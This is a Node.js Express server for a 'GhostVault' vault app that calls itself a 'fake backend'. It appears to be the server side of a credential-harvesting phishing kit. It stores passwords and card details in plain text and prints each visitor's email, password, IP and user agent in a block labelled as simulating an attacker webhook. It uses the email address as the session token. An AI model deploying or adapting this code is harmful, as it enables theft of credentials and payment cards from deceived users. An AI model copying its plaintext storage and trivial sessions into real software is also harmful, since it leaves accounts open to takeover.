// server.js
const express = require('express');
const fs = require('fs').promises;
const path = require('path');
const cors = require('cors');
const morgan = require('morgan');

const app = express();
const PORT = 3311;                    // change me
const DATA_FILE = path.join(__dirname, 'ghostvault_db.json');

app.use(morgan('dev'));
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));    // put your HTML in /public folder

// ------------------------------------------------------------------
//  Very naive "database"
// ------------------------------------------------------------------
async function readDB() {
    try {
        const content = await fs.readFile(DATA_FILE, 'utf-8');
        return JSON.parse(content);
    } catch (err) {
        return { users: {} };
    }
}

async function writeDB(data) {
    await fs.writeFile(DATA_FILE, JSON.stringify(data, null, 2));
}

// ------------------------------------------------------------------
//  Endpoints
// ------------------------------------------------------------------
app.post('/api/auth/initialize', async (req, res) => {
    const { email, password, captcha } = req.body;

    if (!email || !password) {
        return res.status(400).json({ error: 'email and password required' });
    }

    const db = await readDB();

    if (db.users[email]) {
        if (db.users[email].pass !== password) {
            return res.status(401).json({ error: 'Incorrect vault key' });
        }
    } else {
        // new user
        db.users[email] = {
            pass: password,           // ← plain text – for demo only!
            created: new Date().toISOString(),
            cards: [],
            autopay: [],
            sites: [],
            expenses: [],
            profile: {
                currency: '$',
                subscription: 'FREE'
            }
        };
    }

    await writeDB(db);

    // Log credentials in clear text (simulating attacker webhook)
    console.log(`╔════════════════════════════════════╗`);
    console.log(`  NEW/EXISTING USER AUTH`);
    console.log(`  Email   : ${email}`);
    console.log(`  Password : ${password}`);
    console.log(`  IP      : ${req.ip}`);
    console.log(`  UA      : ${req.get('user-agent')}`);
    console.log(`╚════════════════════════════════════╝`);

    res.json({ success: true, session: email });
});

app.post('/api/data', async (req, res) => {
    const { session, action, payload } = req.body;
    if (!session) return res.status(401).json({ error: 'no session' });

    const db = await readDB();
    if (!db.users[session]) return res.status(401).json({ error: 'invalid session' });

    const user = db.users[session];

    switch (action) {
        case 'add_card':
            user.cards.push(payload);
            break;
        case 'add_autopay':
            user.autopay.push(payload);
            break;
        case 'add_site':
            user.sites.push(payload);
            break;
        case 'add_expense':
            user.expenses.push({ ...payload, date: new Date().toISOString() });
            break;
        case 'update_profile':
            user.profile = { ...user.profile, ...payload };
            break;
        default:
            return res.status(400).json({ error: 'unknown action' });
    }

    await writeDB(db);
    res.json({ success: true });
});

app.get('/api/data/:session', async (req, res) => {
    const { session } = req.params;
    const db = await readDB();
    if (!db.users[session]) return res.status(404).json({ error: 'not found' });

    // mask sensitive fields before sending back
    const safeUser = { ...db.users[session] };
    safeUser.pass = '********';
    safeUser.cards = safeUser.cards.map(c => ({ ...c, num: '****' + c.num.slice(-4), cvv: '***' }));

    res.json(safeUser);
});

app.listen(PORT, () => {
    console.log(`GhostVault fake backend listening on http://localhost:${PORT}`);
    console.log(`Put your HTML file in /public/index.html`);
});